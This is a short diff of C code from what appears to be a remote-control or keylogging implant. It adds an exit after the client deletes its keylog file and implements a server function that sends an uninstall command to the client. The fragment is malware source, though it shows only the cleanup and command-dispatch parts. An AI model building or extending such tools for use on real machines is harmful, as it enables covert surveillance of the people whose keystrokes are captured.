@@ -252,6 +252,8 @@ void handle_uninstall(struct session_info * session_info) {
     if (remove(KEYLOG_FILE_PATH) != 0) {
         perror("Error removing keylog");
     }
+
+    exit(EXIT_SUCCESS);
 #endif
 }
 
@@ -878,8 +880,8 @@ void send_run_program(const struct server_options * server_options) {
 }
 
 // Uninstall
-void send_uninstall(int fd) {
-
+void send_uninstall(const struct server_options * server_options) {
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, UNINSTALL);
 }
 
 void send_receive_file(const struct server_options * server_options) {
